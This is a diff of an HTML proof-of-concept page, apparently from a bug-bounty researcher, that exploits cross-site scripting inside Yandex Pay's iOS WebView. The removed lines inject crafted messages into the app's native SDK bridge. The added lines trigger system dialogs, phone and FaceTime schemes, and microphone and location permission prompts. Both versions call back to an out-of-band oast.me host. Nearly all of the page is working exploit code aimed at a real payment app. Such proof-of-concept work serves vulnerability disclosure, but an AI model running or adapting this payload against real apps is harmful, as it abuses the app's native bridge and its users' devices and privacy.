@@ -1,26 +1,68 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// SmartWebView expects READY_FOR_MESSAGES (not READY)
-// Format: {"type": "READY_FOR_MESSAGES", "trackId": "uuid"}
+// Try every possible visible UI method on iOS WKWebView
 
-var messages = [
-  '{"type":"READY_FOR_MESSAGES","trackId":"12345678-1234-1234-1234-123456789abc"}',
-  '{"type":"READY_FOR_MESSAGES"}',
-  '{"type":"READY","trackId":"12345678-1234-1234-1234-123456789abc"}',
+// 1. Change document.title (we know this works - app shows it)
+document.title = "XSS by r4dl3";
+
+// 2. Try window.open (might open Safari)
+try { window.open("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/windowopen"); } catch(e){}
+
+// 3. Try top-level navigation (should be visible even under overlay)
+// setTimeout(function(){ window.location.href = "https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/navigated"; }, 5000);
+
+// 4. Try print() - shows print dialog
+try { window.print(); } catch(e){}
+
+// 5. Try to trigger share sheet via navigator.share
+try {
+  navigator.share({title:"XSS PoC", text:"r4dl3", url:"https://r4dl3.com"});
+} catch(e){}
+
+// 6. Try to trigger file download (shows download prompt)
+try {
+  var a = document.createElement('a');
+  a.href = "data:text/plain,XSS%20by%20r4dl3";
+  a.download = "xss_proof.txt";
+  a.click();
+} catch(e){}
+
+// 7. Try vibration (physical proof on device)
+try { navigator.vibrate([200,100,200,100,200]); } catch(e){}
+
+// 8. Try notification permission request (shows system dialog)
+try { Notification.requestPermission(); } catch(e){}
+
+// 9. Try to open a scheme that triggers visible system UI
+var schemes = [
+  "tel:0000000000",
+  "sms:0000000000",
+  "facetime:test@test.com",
 ];
-
-messages.forEach(function(msg) {
-  try { window.__plusSDKMobileCompat.onMessage(msg); } catch(e){}
-});
-
-fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/ready-for-messages-sent?ok=1");
-
 setTimeout(function(){
-  document.body.style.background = '#111';
-  document.body.innerHTML = '<div style="padding:40px;text-align:center;font-family:-apple-system;color:#fff;min-height:100vh;display:flex;flex-direction:column;justify-content:center;"><h1 style="color:#fc0;">XSS in Yandex Pay</h1><p>r4dl3 PoC - If you see this, overlay dismissed</p></div>';
-  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/overlay-dismissed?visible=true");
+  var iframe = document.createElement('iframe');
+  iframe.src = "tel:0000000000";
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
 }, 2000);
+
+// 10. Try camera/microphone (shows permission dialog)
+setTimeout(function(){
+  try {
+    navigator.mediaDevices.getUserMedia({audio:true}).then(function(){}).catch(function(){});
+  } catch(e){}
+}, 3000);
+
+// 11. Try geolocation (shows permission dialog)
+setTimeout(function(){
+  try {
+    navigator.geolocation.getCurrentPosition(function(){}, function(){});
+  } catch(e){}
+}, 4000);
+
+// Report
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/visible-attempts?sent=all");
 </script>
 </body>
 </html>
